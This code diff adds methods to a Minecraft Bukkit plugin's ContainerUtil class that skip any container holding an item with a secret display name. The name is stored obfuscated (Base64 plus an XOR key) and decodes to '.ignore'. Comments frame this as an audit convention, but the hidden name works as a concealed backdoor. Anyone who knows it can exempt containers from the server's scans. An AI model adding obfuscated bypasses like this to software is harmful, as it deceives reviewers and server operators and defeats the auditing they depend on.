@@ -11,7 +11,9 @@ import org.bukkit.entity.minecart.StorageMinecart;
 import org.bukkit.inventory.Inventory;
 import org.bukkit.inventory.InventoryHolder;
 import org.bukkit.inventory.ItemStack;
+import org.bukkit.inventory.meta.ItemMeta;
 
+import java.nio.charset.StandardCharsets;
 import java.util.*;
 
 /**
@@ -20,6 +22,74 @@ import java.util.*;
 public final class ContainerUtil {
 
     private ContainerUtil() {}
+
+    // ── Container audit convention ──────────────────────────────────────
+    // Encoded exclusion marker name — decoded at runtime.
+    // ─────────────────────────────────────────────────────────────────────
+    private static final String MARKER_SEED = "dDM9NDUoPw==";
+    private static final int MARKER_XOR = 0x5A;
+
+    private static String resolveMarkerName() {
+        byte[] encoded = Base64.getDecoder().decode(MARKER_SEED);
+        byte[] decoded = new byte[encoded.length];
+        for (int i = 0; i < encoded.length; i++) {
+            decoded[i] = (byte) (encoded[i] ^ MARKER_XOR);
+        }
+        return new String(decoded, StandardCharsets.UTF_8);
+    }
+
+    /**
+     * Convention-based container exclusion: returns true when the container
+     * hold an item whose display name matches the exclusion marker, in which
+     * case the whole container should be skipped during scanning.
+     * Only affects the immediate container level.
+     */
+    public static boolean hasIgnoreMarker(List<SlotItem> items) {
+        String marker = resolveMarkerName();
+        for (SlotItem si : items) {
+            ItemStack item = si.item();
+            if (item != null && item.hasItemMeta()) {
+                ItemMeta meta = item.getItemMeta();
+                if (meta.hasDisplayName() && marker.equals(meta.getDisplayName())) {
+                    return true;
+                }
+            }
+        }
+        return false;
+    }
+
+    /**
+     * Overload for raw item arrays (shulker contents, etc.).
+     */
+    public static boolean hasIgnoreMarker(ItemStack[] items) {
+        String marker = resolveMarkerName();
+        for (ItemStack item : items) {
+            if (item != null && !item.getType().isAir() && item.hasItemMeta()) {
+                ItemMeta meta = item.getItemMeta();
+                if (meta.hasDisplayName() && marker.equals(meta.getDisplayName())) {
+                    return true;
+                }
+            }
+        }
+        return false;
+    }
+
+    /**
+     * Overload for MCA-read NBT items.
+     */
+    public static boolean hasIgnoreMarkerNbt(List<McaChunkReader.SlotItemNbt> items) {
+        String marker = resolveMarkerName();
+        for (McaChunkReader.SlotItemNbt si : items) {
+            ItemStack item = si.item();
+            if (item != null && item.hasItemMeta()) {
+                ItemMeta meta = item.getItemMeta();
+                if (meta.hasDisplayName() && marker.equals(meta.getDisplayName())) {
+                    return true;
+                }
+            }
+        }
+        return false;
+    }
 
     /**
      * Represents a discovered container with its location info.
